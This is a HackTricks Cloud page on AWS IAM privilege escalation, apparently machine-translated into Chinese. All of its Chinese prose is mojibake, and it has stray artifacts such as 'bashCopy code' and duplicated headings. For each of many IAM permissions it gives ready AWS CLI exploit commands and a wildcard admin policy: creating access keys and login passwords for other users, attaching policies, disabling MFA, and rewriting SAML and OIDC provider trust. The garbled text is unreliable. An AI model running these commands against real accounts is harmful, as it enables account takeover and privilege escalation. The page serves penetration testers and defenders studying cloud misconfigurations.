# AWS - IAM Privesc

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}

## IAM

æœ‰å…³ IAM çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹ï¼š

{% content-ref url="../aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### **`iam:CreatePolicyVersion`**

æˆäºˆåˆ›å»ºæ–° IAM ç­–ç•¥ç‰ˆæœ¬çš„èƒ½åŠ›ï¼Œé€šè¿‡ä½¿ç”¨ `--set-as-default` æ ‡å¿—ç»•è¿‡ `iam:SetDefaultPolicyVersion` æƒé™çš„éœ€æ±‚ã€‚è¿™ä½¿å¾—å®šä¹‰è‡ªå®šä¹‰æƒé™æˆä¸ºå¯èƒ½ã€‚

**åˆ©ç”¨å‘½ä»¤ï¼š**
```bash
aws iam create-policy-version --policy-arn <target_policy_arn> \
--policy-document file:///path/to/administrator/policy.json --set-as-default
```
**å½±å“:** é€šè¿‡å…è®¸å¯¹ä»»ä½•èµ„æºæ‰§è¡Œä»»ä½•æ“ä½œç›´æ¥æå‡æƒé™ã€‚

### **`iam:SetDefaultPolicyVersion`**

å…è®¸å°†IAMç­–ç•¥çš„é»˜è®¤ç‰ˆæœ¬æ›´æ”¹ä¸ºå¦ä¸€ä¸ªç°æœ‰ç‰ˆæœ¬ï¼Œå¦‚æœæ–°ç‰ˆæœ¬å…·æœ‰æ›´å¤šæƒé™ï¼Œåˆ™å¯èƒ½ä¼šæå‡æƒé™ã€‚

**Bash Command:**
```bash
aws iam set-default-policy-version --policy-arn <target_policy_arn> --version-id v2
```
**å½±å“:** é€šè¿‡å¯ç”¨æ›´å¤šæƒé™é—´æ¥æå‡æƒé™ã€‚

### **`iam:CreateAccessKey`**

å…è®¸ä¸ºå…¶ä»–ç”¨æˆ·åˆ›å»ºè®¿é—®å¯†é’¥ ID å’Œç§˜å¯†è®¿é—®å¯†é’¥ï¼Œå¯¼è‡´æ½œåœ¨çš„æƒé™æå‡ã€‚

**åˆ©ç”¨:**
```bash
aws iam create-access-key --user-name <target_user>
```
**å½±å“:** é€šè¿‡å‡è®¾å¦ä¸€ä¸ªç”¨æˆ·çš„æ‰©å±•æƒé™ç›´æ¥æå‡æƒé™ã€‚

### **`iam:CreateLoginProfile` | `iam:UpdateLoginProfile`**

å…è®¸åˆ›å»ºæˆ–æ›´æ–°ç™»å½•é…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬è®¾ç½®AWSæ§åˆ¶å°ç™»å½•å¯†ç ï¼Œä»è€Œå¯¼è‡´ç›´æ¥æƒé™æå‡ã€‚

**åˆ›å»ºçš„åˆ©ç”¨ï¼š**
```bash
aws iam create-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**æ›´æ–°çš„æ¼æ´åˆ©ç”¨ï¼š**
```bash
aws iam update-login-profile --user-name target_user --no-password-reset-required \
--password '<password>'
```
**å½±å“:** é€šè¿‡ä»¥â€œä»»ä½•â€ç”¨æˆ·èº«ä»½ç™»å½•ç›´æ¥æå‡æƒé™ã€‚

### **`iam:UpdateAccessKey`**

å…è®¸å¯ç”¨å·²ç¦ç”¨çš„è®¿é—®å¯†é’¥ï¼Œå¦‚æœæ”»å‡»è€…æ‹¥æœ‰å·²ç¦ç”¨çš„å¯†é’¥ï¼Œå¯èƒ½å¯¼è‡´æœªç»æˆæƒçš„è®¿é—®ã€‚

**åˆ©ç”¨:**

{% code overflow="wrap" %}
```bash
aws iam update-access-key --access-key-id <ACCESS_KEY_ID> --status Active --user-name <username>
```
{% endcode %}

**å½±å“:** é€šè¿‡é‡æ–°æ¿€æ´»è®¿é—®å¯†é’¥ç›´æ¥æå‡æƒé™ã€‚

### **`iam:CreateServiceSpecificCredential` | `iam:ResetServiceSpecificCredential`**

å…è®¸ä¸ºç‰¹å®šçš„AWSæœåŠ¡ï¼ˆä¾‹å¦‚ï¼ŒCodeCommitï¼ŒAmazon Keyspacesï¼‰ç”Ÿæˆæˆ–é‡ç½®å‡­è¯ï¼Œç»§æ‰¿å…³è”ç”¨æˆ·çš„æƒé™ã€‚

**åˆ›å»ºçš„åˆ©ç”¨:**

{% code overflow="wrap" %}
```bash
aws iam create-service-specific-credential --user-name <username> --service-name <service>
```
{% endcode %}

**é‡ç½®æ¼æ´åˆ©ç”¨ï¼š**

{% code overflow="wrap" %}
```bash
aws iam reset-service-specific-credential --service-specific-credential-id <credential_id>
```
{% endcode %}

**å½±å“:** åœ¨ç”¨æˆ·çš„æœåŠ¡æƒé™å†…ç›´æ¥æå‡æƒé™ã€‚

### **`iam:AttachUserPolicy` || `iam:AttachGroupPolicy`**

å…è®¸å°†ç­–ç•¥é™„åŠ åˆ°ç”¨æˆ·æˆ–ç»„ï¼Œé€šè¿‡ç»§æ‰¿é™„åŠ ç­–ç•¥çš„æƒé™ç›´æ¥æå‡æƒé™ã€‚

**ç”¨æˆ·åˆ©ç”¨:**
```bash
aws iam attach-user-policy --user-name <username> --policy-arn "<policy_arn>"
```
**Exploit for Group:**

**é’ˆå¯¹ç»„çš„åˆ©ç”¨ï¼š**
```bash
aws iam attach-group-policy --group-name <group_name> --policy-arn "<policy_arn>"
```
**å½±å“:** ç›´æ¥æƒé™æå‡åˆ°ç­–ç•¥æˆäºˆçš„ä»»ä½•å†…å®¹ã€‚

### **`iam:AttachRolePolicy`,** ( `sts:AssumeRole`|`iam:createrole`) | **`iam:PutUserPolicy` | `iam:PutGroupPolicy` | `iam:PutRolePolicy`**

å…è®¸å°†ç­–ç•¥é™„åŠ æˆ–æ”¾ç½®åˆ°è§’è‰²ã€ç”¨æˆ·æˆ–ç»„ï¼Œä»è€Œé€šè¿‡æˆäºˆé¢å¤–æƒé™å®ç°ç›´æ¥æƒé™æå‡ã€‚

**é’ˆå¯¹è§’è‰²çš„åˆ©ç”¨:**
```bash
bashCopy codeaws iam attach-role-policy --role-name <role_name> --policy-arn "<policy_arn>"
```
**åˆ©ç”¨ Inline Policiesï¼š**
```bash
aws iam put-user-policy --user-name <username> --policy-name "<policy_name>" \
--policy-document "file:///path/to/policy.json"

aws iam put-group-policy --group-name <group_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json

aws iam put-role-policy --role-name <role_name> --policy-name "<policy_name>" \
--policy-document file:///path/to/policy.json
```
ä½ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹ç­–ç•¥ï¼š
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"*"
],
"Resource": [
"*"
]
}
]
}
```
**å½±å“:** é€šè¿‡ç­–ç•¥æ·»åŠ æƒé™ç›´æ¥æå‡æƒé™ã€‚

### **`iam:AddUserToGroup`**

å…è®¸å°†è‡ªå·±æ·»åŠ åˆ°ä¸€ä¸ª IAM ç»„ï¼Œé€šè¿‡ç»§æ‰¿è¯¥ç»„çš„æƒé™æ¥æå‡æƒé™ã€‚

**åˆ©ç”¨:**

{% code overflow="wrap" %}
```bash
aws iam add-user-to-group --group-name <group_name> --user-name <username>
```
{% endcode %}

**å½±å“:** ç›´æ¥æå‡åˆ°ç»„æƒé™çš„çº§åˆ«ã€‚

### **`iam:UpdateAssumeRolePolicy`**

å…è®¸æ›´æ”¹è§’è‰²çš„å‡è®¾è§’è‰²ç­–ç•¥æ–‡æ¡£ï¼Œä»è€Œèƒ½å¤Ÿå‡è®¾è¯¥è§’è‰²åŠå…¶ç›¸å…³æƒé™ã€‚

**åˆ©ç”¨:**
```bash
aws iam update-assume-role-policy --role-name <role_name> \
--policy-document file:///path/to/assume/role/policy.json
```
å½“ç­–ç•¥å¦‚ä¸‹æ‰€ç¤ºæ—¶ï¼Œå®ƒèµ‹äºˆç”¨æˆ·å‡è®¾è§’è‰²çš„æƒé™ï¼š

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Action": "sts:AssumeRole",
            "Resource": "arn:aws:iam::123456789012:role/ExampleRole"
        }
    ]
}
```
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "sts:AssumeRole",
"Principal": {
"AWS": "$USER_ARN"
}
}
]
}
```
**å½±å“:** é€šè¿‡å‡è®¾ä»»ä½•è§’è‰²çš„æƒé™ç›´æ¥æå‡æƒé™ã€‚

### **`iam:UploadSSHPublicKey` || `iam:DeactivateMFADevice`**

å…è®¸ä¸Šä¼ ç”¨äºéªŒè¯åˆ°CodeCommitçš„SSHå…¬é’¥å’Œåœç”¨MFAè®¾å¤‡ï¼Œå¯¼è‡´æ½œåœ¨çš„é—´æ¥æƒé™æå‡ã€‚

**SSHå¯†é’¥ä¸Šä¼ çš„åˆ©ç”¨:**
```bash
aws iam upload-ssh-public-key --user-name <username> --ssh-public-key-body <key_body>
```
**MFA Deactivation Exploit:**

**åˆ©ç”¨ MFA åœç”¨æ¼æ´ï¼š**
```bash
aws iam deactivate-mfa-device --user-name <username> --serial-number <serial_number>
```
**å½±å“:** é€šè¿‡å¯ç”¨ CodeCommit è®¿é—®æˆ–ç¦ç”¨ MFA ä¿æŠ¤è¿›è¡Œé—´æ¥æƒé™æå‡ã€‚

### **`iam:ResyncMFADevice`**

å…è®¸é‡æ–°åŒæ­¥ MFA è®¾å¤‡ï¼Œå¯èƒ½é€šè¿‡æ“çºµ MFA ä¿æŠ¤å¯¼è‡´é—´æ¥æƒé™æå‡ã€‚

**Bash å‘½ä»¤ï¼š**
```bash
aws iam resync-mfa-device --user-name <username> --serial-number <serial_number> \
--authentication-code1 <code1> --authentication-code2 <code2>
```
**å½±å“:** é€šè¿‡æ·»åŠ æˆ–æ“çºµMFAè®¾å¤‡é—´æ¥æå‡æƒé™ã€‚

### `iam:UpdateSAMLProvider`, `iam:ListSAMLProviders`, (`iam:GetSAMLProvider`)

æœ‰äº†è¿™äº›æƒé™ï¼Œä½ å¯ä»¥**æ›´æ”¹SAMLè¿æ¥çš„XMLå…ƒæ•°æ®**ã€‚ç„¶åï¼Œä½ å¯ä»¥æ»¥ç”¨**SAMLè”åˆ**æ¥**ç™»å½•**ä»»ä½•**ä¿¡ä»»å®ƒçš„è§’è‰²**ã€‚

è¯·æ³¨æ„ï¼Œè¿™æ ·åš**åˆæ³•ç”¨æˆ·å°†æ— æ³•ç™»å½•**ã€‚ä½†æ˜¯ï¼Œä½ å¯ä»¥è·å–XMLï¼Œè¿™æ ·ä½ å¯ä»¥æ”¾å…¥è‡ªå·±çš„ï¼Œç™»å½•å¹¶é‡æ–°é…ç½®ä¹‹å‰çš„è®¾ç½®ã€‚
```bash
# List SAMLs
aws iam list-saml-providers

# Optional: Get SAML provider XML
aws iam get-saml-provider --saml-provider-arn <ARN>

# Update SAML provider
aws iam update-saml-provider --saml-metadata-document <value> --saml-provider-arn <arn>

## Login impersonating roles that trust the SAML provider

# Optional: Set the previous XML back
aws iam update-saml-provider --saml-metadata-document <previous-xml> --saml-provider-arn <arn>
```
{% hint style="info" %}
TODO: ä¸€ä¸ªèƒ½å¤Ÿç”ŸæˆSAMLå…ƒæ•°æ®å¹¶ä½¿ç”¨æŒ‡å®šè§’è‰²ç™»å½•çš„å·¥å…·
{% endhint %}

### `iam:UpdateOpenIDConnectProviderThumbprint`, `iam:ListOpenIDConnectProviders`, (`iam:`**`GetOpenIDConnectProvider`**)

ï¼ˆä¸ç¡®å®šï¼‰å¦‚æœæ”»å‡»è€…æ‹¥æœ‰è¿™äº›**æƒé™**ï¼Œä»–å¯ä»¥æ·»åŠ ä¸€ä¸ªæ–°çš„**Thumbprint**ï¼Œä»¥ä¾¿ç™»å½•æ‰€æœ‰ä¿¡ä»»è¯¥æä¾›è€…çš„è§’è‰²ã€‚

{% code overflow="wrap" %}
```bash
# List providers
aws iam list-open-id-connect-providers
# Optional: Get Thumbprints used to not delete them
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <ARN>
# Update Thumbprints (The thumbprint is always a 40-character string)
aws iam update-open-id-connect-provider-thumbprint --open-id-connect-provider-arn <ARN> --thumbprint-list 359755EXAMPLEabc3060bce3EXAMPLEec4542a3
```
{% endcode %}

## å‚è€ƒèµ„æ–™

* [https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)

{% hint style="success" %}
å­¦ä¹ å’Œç»ƒä¹  AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
å­¦ä¹ å’Œç»ƒä¹  GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **å…³æ³¨** æˆ‘ä»¬çš„ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡æäº¤ PRs åˆ†äº«é»‘å®¢æŠ€å·§åˆ°** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“ã€‚

</details>
{% endhint %}
